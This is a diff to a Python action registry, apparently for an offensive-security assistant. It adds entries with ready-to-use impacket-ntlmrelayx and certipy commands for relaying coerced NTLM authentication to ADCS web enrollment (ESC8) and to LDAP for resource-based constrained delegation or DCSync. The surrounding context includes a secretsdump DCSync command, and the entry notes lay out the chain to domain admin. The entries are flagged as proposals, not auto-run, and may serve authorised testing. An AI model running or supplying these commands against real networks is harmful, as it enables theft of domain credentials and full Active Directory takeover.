@@ -379,6 +379,24 @@ ACTION_REGISTRY: dict[str, Action] = {
         risk="propose", runnable=False, outputs="raw",
         note="Coerce machine auth (MS-RPRN/MS-EFSR/MS-DFSNM) to a waiting ntlmrelayx. WebClient "
              "targets coerce over HTTP (relay to ADCS); others coerce the machine account over SMB."),
+    "ntlmrelay_adcs_esc8": _a("ntlmrelay_adcs_esc8",
+        ["# stand up the relay to the CA's web enrollment, then coerce a DC/host over HTTP:",
+         "impacket-ntlmrelayx -t http://<CA-HOST>/certsrv/certfnsh.asp -smb2support --adcs "
+         "--template DomainController",
+         "# the relayed machine cert lands in ntlmrelayx; auth it for a TGT / NT hash:",
+         "certipy auth -pfx <machine>.pfx -dc-ip $IP"],
+        risk="propose", runnable=False, outputs="raw",
+        note="ESC8: relay coerced HTTP auth (WebClient) to ADCS web enrollment -> machine/DC cert "
+             "-> PKINIT -> DA. Pair with coerce_authentication against a webclient_running host."),
+    "ntlmrelay_ldap_rbcd": _a("ntlmrelay_ldap_rbcd",
+        ["# relay coerced SMB auth to LDAP on the DC and grant RBCD (or DCSync) to a controlled acct:",
+         "impacket-ntlmrelayx -t ldaps://$IP --delegate-access --escalate-user 'ATTACKER$' "
+         "--remove-mic -smb2support",
+         "# no computer yet? --add-computer creates one first (needs MachineAccountQuota > 0)",
+         "impacket-ntlmrelayx -t ldaps://$IP --add-computer -smb2support"],
+        risk="propose", runnable=False, outputs="raw",
+        note="Relay coerced machine auth to LDAP: grant RBCD to an attacker computer (then S4U), "
+             "or escalate to DCSync. Needs the DC reachable over LDAP and signing not enforced."),
     "dcsync_secretsdump": _a("dcsync_secretsdump",
         ["impacket-secretsdump -just-dc $DOMAIN/<USER>:<PASS>@$IP"],
         risk="propose", runnable=False, outputs="raw",
